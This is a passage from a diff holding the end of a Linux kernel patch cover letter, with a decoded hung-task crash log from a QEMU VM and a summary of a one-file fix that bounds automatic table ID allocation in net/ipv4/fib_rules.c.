+[  283.310383]  ? filemap_get_entry (include/linux/rcupdate.h:882 mm/filemap.c:1925)
+[  283.310446]  ? avc_has_perm (include/linux/rcupdate.h:882 security/selinux/avc.c:1164 security/selinux/avc.c:1194)
+[  283.310452]  ? __pfx_rtnetlink_rcv_msg (net/core/rtnetlink.c:4497)
+[  283.310456]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
+[  283.310462]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
+[  283.310465]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
+[  283.310468]  ____sys_sendmsg (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2713 (discriminator 1))
+[  283.310473]  ___sys_sendmsg (net/socket.c:2767)
+[  283.310479]  __sys_sendmsg (net/socket.c:2799)
+[  283.310535]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
+[  283.310544]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
+[  283.310549] RIP: 0033:0x7f459504efa3
+[  283.310552] RSP: 002b:00007fff8e86dbc8 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
+[  283.310555] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f459504efa3
+[  283.310557] RDX: 0000000000000000 RSI: 00007fff8e86dc30 RDI: 0000000000000003
+[  283.310558] RBP: 000000006a918a65 R08: 0000000000000001 R09: 0000000000000000
+[  283.310560] R10: 00007f45950ceac0 R11: 0000000000000246 R12: 0000000000000001
+[  283.310561] R13: 0000000000000000 R14: 00007fff8e86e450 R15: 000055d6921e6020
+[  283.310563]  </TASK>
+[  283.310578] NMI backtrace for cpu 0
+[  283.310626] CPU: 0 UID: 0 PID: 31 Comm: khungtaskd Not tainted 7.2.0-15794-g1b78070aaef6 #3 PREEMPT(lazy) 
+[  283.310631] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  283.310693] Call Trace:
+[  283.310930]  <TASK>
+[  283.310934]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
+[  283.310993]  nmi_cpu_backtrace (lib/nmi_backtrace.c:123)
+[  283.311001]  ? __pfx_nmi_raise_cpu_backtrace (usercopy_64.c:?)
+[  283.311007]  nmi_trigger_cpumask_backtrace (lib/nmi_backtrace.c:66)
+[  283.311010]  sys_info (include/linux/nmi.h:164 lib/sys_info.c:157 lib/sys_info.c:165)
+[  283.311013]  watchdog (kernel/hung_task.c:353 kernel/hung_task.c:561)
+[  283.311221]  ? __pfx_watchdog (kernel/hung_task.c:426)
+[  283.311228]  kthread (kernel/kthread.c:436)
+[  283.311332]  ? __pfx_kthread (kernel/kthread.c:948)
+[  283.311339]  ret_from_fork (arch/x86/kernel/process.c:158)
+[  283.311447]  ? __pfx_kthread (kernel/kthread.c:948)
+[  283.311455]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
+[  283.311559]  </TASK>
+[  283.311666] Sending NMI from CPU 0 to CPUs 1:
+[  283.311788] NMI backtrace for cpu 1
+[  283.311797] CPU: 1 UID: 0 PID: 15 Comm: pr/ttyS0 Not tainted 7.2.0-15794-g1b78070aaef6 #3 PREEMPT(lazy) 
+[  283.311801] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  283.311803] RIP: 0010:io_serial_out (arch/x86/kernel/early_printk.c:108)
+[  283.311812] Code: 0f 1f 40 00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa 0f b6 8f d9 00 00 00 89 d0 0f b7 57 08 d3 e6 01 f2 ee <e9> c5 ea 98 00 0f 1f 44 00 00 90 90 90 90 90 90 90 90 90 90 90 90
+All code
+========
+   0:	0f 1f 40 00          	nopl   0x0(%rax)
+   4:	90                   	nop
+   5:	90                   	nop
+   6:	90                   	nop
+   7:	90                   	nop
+   8:	90                   	nop
+   9:	90                   	nop
+   a:	90                   	nop
+   b:	90                   	nop
+   c:	90                   	nop
+   d:	90                   	nop
+   e:	90                   	nop
+   f:	90                   	nop
+  10:	90                   	nop
+  11:	90                   	nop
+  12:	90                   	nop
+  13:	90                   	nop
+  14:	f3 0f 1e fa          	endbr64
+  18:	0f b6 8f d9 00 00 00 	movzbl 0xd9(%rdi),%ecx
+  1f:	89 d0                	mov    %edx,%eax
+  21:	0f b7 57 08          	movzwl 0x8(%rdi),%edx
+  25:	d3 e6                	shl    %cl,%esi
+  27:	01 f2                	add    %esi,%edx
+  29:	ee                   	out    %al,(%dx)
+  2a:*	e9 c5 ea 98 00       	jmp    0x98eaf4		<-- trapping instruction
+  2f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
+  34:	90                   	nop
+  35:	90                   	nop
+  36:	90                   	nop
+  37:	90                   	nop
+  38:	90                   	nop
+  39:	90                   	nop
+  3a:	90                   	nop
+  3b:	90                   	nop
+  3c:	90                   	nop
+  3d:	90                   	nop
+  3e:	90                   	nop
+  3f:	90                   	nop
+
+Code starting with the faulting instruction
+===========================================
+   0:	e9 c5 ea 98 00       	jmp    0x98eaca
+   5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
+   a:	90                   	nop
+   b:	90                   	nop
+   c:	90                   	nop
+   d:	90                   	nop
+   e:	90                   	nop
+   f:	90                   	nop
+  10:	90                   	nop
+  11:	90                   	nop
+  12:	90                   	nop
+  13:	90                   	nop
+  14:	90                   	nop
+  15:	90                   	nop
+[  283.311818] RSP: 0018:ffffac7600083d28 EFLAGS: 00000002
+[  283.311821] RAX: 0000000000000020 RBX: ffff8f6081152010 RCX: 0000000000000000
+[  283.311823] RDX: 00000000000003f8 RSI: 0000000000000000 RDI: ffffffff89a48c60
+[  283.311824] RBP: ffffffff89a48c60 R08: 2e322e3720646574 R09: ffffffff87b60400
+[  283.311826] R10: 6e69617420746f4e R11: 6f4e202020202020 R12: 000000000000000f
+[  283.311827] R13: 0000000000000000 R14: ffffac7600083e88 R15: 0000000000000020
+[  283.311844] FS:  0000000000000000(0000) GS:ffff8f6174361000(0000) knlGS:0000000000000000
+[  283.311846] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  283.311848] CR2: 0000563528d1fb40 CR3: 0000000005e1a005 CR4: 0000000000370ef0
+[  283.311849] Call Trace:
+[  283.311993]  <TASK>
+[  283.311995]  __serial8250_console_fifo_write (include/linux/serial_core.h:817 drivers/tty/serial/8250/8250_port.c:3287 drivers/tty/serial/8250/8250_port.c:3359)
+[  283.312002]  serial8250_console_write (drivers/tty/serial/8250/8250_port.c:3378 drivers/tty/serial/8250/8250_port.c:3429 drivers/tty/serial/8250/8250_port.c:3493)
+[  283.312007]  nbcon_emit_next_record (kernel/printk/nbcon.c:1070)
+[  283.312054]  nbcon_emit_one (kernel/printk/nbcon.c:1157)
+[  283.312058]  nbcon_kthread_func (kernel/printk/nbcon.c:1271)
+[  283.312062]  ? __pfx_nbcon_kthread_func (kernel/printk/nbcon.c:1677)
+[  283.312066]  kthread (kernel/kthread.c:436)
+[  283.312070]  ? __pfx_kthread (kernel/kthread.c:948)
+[  283.312073]  ret_from_fork (arch/x86/kernel/process.c:158)
+[  283.312076]  ? __pfx_kthread (kernel/kthread.c:948)
+[  283.312078]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
+[  283.312083]  </TASK>
+[  283.319999] Kernel panic - not syncing: hung_task: blocked tasks
+[  293.702918] CPU: 0 UID: 0 PID: 31 Comm: khungtaskd Not tainted 7.2.0-15794-g1b78070aaef6 #3 PREEMPT(lazy) 
+[  293.811630] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  293.993807] Call Trace:
+[  294.025350]  <TASK>
+[  294.043962]  vpanic (kernel/panic.c:651)
+[  294.090991]  panic (kernel/panic.c:788)
+[  294.141252]  watchdog (kernel/hung_task.c:356 kernel/hung_task.c:561)
+[  294.194098]  ? __pfx_watchdog (kernel/hung_task.c:426)
+[  294.278730]  kthread (kernel/kthread.c:436)
+[  294.329704]  ? __pfx_kthread (kernel/kthread.c:948)
+[  294.431305]  ret_from_fork (arch/x86/kernel/process.c:158)
+[  294.492124]  ? __pfx_kthread (kernel/kthread.c:948)
+[  294.562256]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
+[  294.662989]  </TASK>
+[  294.727400] Kernel Offset: 0x6200000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
+[  294.953855] ---[ end Kernel panic - not syncing: hung_task: blocked tasks ]---
+-----END crash log-----
+
+Best regards,
+Zihan Xi
+
+Zihan Xi (1):
+  ipv4: fib: bound automatic table ID allocation
+
+ net/ipv4/fib_rules.c | 4 +++-
+ 1 file changed, 3 insertions(+), 1 deletion(-)
+
+-- 
+2.43.0
+
